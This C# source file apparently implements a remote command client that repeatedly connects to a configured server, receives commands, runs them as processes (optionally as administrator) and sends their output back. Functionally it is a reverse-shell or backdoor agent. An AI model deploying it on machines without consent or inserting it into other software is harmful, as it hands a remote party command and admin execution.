using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace CommanderClient
{
	class Listener
	{
		public static string Host { get; set; }
		public static string port { get; set; }
		public static string CustomName { get; set; }
		

		public static Socket ServerSocket;
		public static void Run() {
			Thread th = new Thread(new ThreadStart(ClientThread));
			th.Start();
		}
		static void ClientThread() {
			//this thread will retry to connect when disconnected
			ServerSocket = new Socket(SocketType.Stream, ProtocolType.Tcp);
			Thread th = new Thread(new ThreadStart(ListenToServer));
			while (true) {
				Thread.Sleep(6000);     //wait for a minute for next retry
				if (!ServerSocket.Connected) {
					try {
						Console.WriteLine("Connecting...");
						ServerSocket.Connect(Host, int.Parse(Listener.port));
						Console.WriteLine("Connected. Starting listenning thread.");
						th.Start();
					} catch (Exception ex) { Program.logger.Log(logType.Error, ex.Message); }
				}
			}
		}
		public static void ListenToServer() {
			//this thread will get and read received text
			Console.WriteLine("Listen Thread has been run");
			while (ServerSocket.Connected) {
				if (Read(true, out string text)) {
					Console.WriteLine("Data received");
					readInput(text);
				}
			}
		}
		public static Process CommandProcess=null;		//Normal run and exit commands
		
		static void readInput(string Text) {        //this method reads received text
			Console.WriteLine("readInput(\"{0}\")", Text);
			string flags = Regex.Match(Text, @"^\<.+\>\b", RegexOptions.Multiline).Value;   //get flags by regex (example)-> https://regexr.com/4obl9 recommend to use external browser.
			Text = Text.Substring(flags.Length);        //remove flags
			flags = flags.Trim('<', '>');
			Console.WriteLine("Flags:\"{0}\"\nText:\"{1}\"", flags, Text);

			//Flages: $:server_message, @:write_in_a_running_cmd

			if (flags == "$") {
				//internall commands flag
				//this line must run by internalcmd.Do
				Console.WriteLine("Internal Command:\"{0}\"", Text);
				Program.internalCmd.Do(Text);
			} else if (flags == "@") {
				if (internalcmds.DirectCmd.CmdProcess == null || internalcmds.DirectCmd.CmdProcess.HasExited) {
					Send("No running cmd");
				} else
					internalcmds.DirectCmd.CmdProcess.StandardInput.WriteLine(Text);
			} else {
				if (internalcmds.DirectCmd.CmdProcess != null && !internalcmds.DirectCmd.CmdProcess.HasExited) {
					internalcmds.DirectCmd.CmdProcess.StandardInput.WriteLine(Text);
				} else {

					//common command
					ProcessStartInfo startInf = new ProcessStartInfo();
					startInf.FileName = Text.Split(' ')[0];
					startInf.Arguments = Text.Substring(startInf.FileName.Length);

					//'s' flag for using shell execute
					startInf.UseShellExecute = flags.Contains("s");

					//'o' flag for redirecting standard output
					startInf.RedirectStandardOutput = flags.Contains("o");

					//'a' flag for run as admin
					if (flags.Contains("a"))
						startInf.Verb = "runas";

					//'w' wait for exit
					try {
						CommandProcess = Process.Start(startInf);
						if (flags.Contains("w"))
							CommandProcess.WaitForExit();
						else
							CommandProcess.WaitForExit(100);
						if (flags.Contains("o")) {
							CommandProcess.WaitForExit();
							Send(CommandProcess.StandardOutput.ReadToEnd());
						} else if (CommandProcess.HasExited)
							Send($"Program exited at {CommandProcess.ExitTime} with code({CommandProcess.ExitCode})");
					} catch (Exception ex) { Send($"Error: {ex.Message}"); }
				}
			}
		}
		public static int WaitSec { get; set; }

		public static bool Read(bool Wait, out string Text) {
			Text = "";
			int count = 0;
			var t = DateTime.Now;
			while (true) {
					try {
						byte[] buffer = new byte[1024];
						count = ServerSocket.Receive(buffer);
						Text += Encoding.ASCII.GetString(buffer, 0, count);
					} catch (Exception ex) { Program.logger.Log(logType.Error, $"EXCEPTION IN CLIENT/READ: {ex.Message}"); break; }
					 if(Text.Contains("<$eof>")){
						break;
					}else if(count==0){
						if(Wait){
							if( (t - DateTime.Now) >= new TimeSpan(0, 0, WaitSec) )
								break;
						}else
							break;
					}
				}
				bool Empty=Text=="";
			if (Text.Length != 0) {
				try { Text=Text.Replace("<$eof>", ""); } catch { /*do nothing*/ }
			}
			return !Empty;
		}
		public static void Send(string Text) {
			Text +="<$eof>";
			byte[] buffer = Encoding.ASCII.GetBytes(Text);
			try {
				ServerSocket.Send(buffer);
			} catch (Exception ex) { Program.logger.Log(logType.Error, $"EXCEPTION IN SERVER/SEND: {ex.Message}"); }

		}
	}
}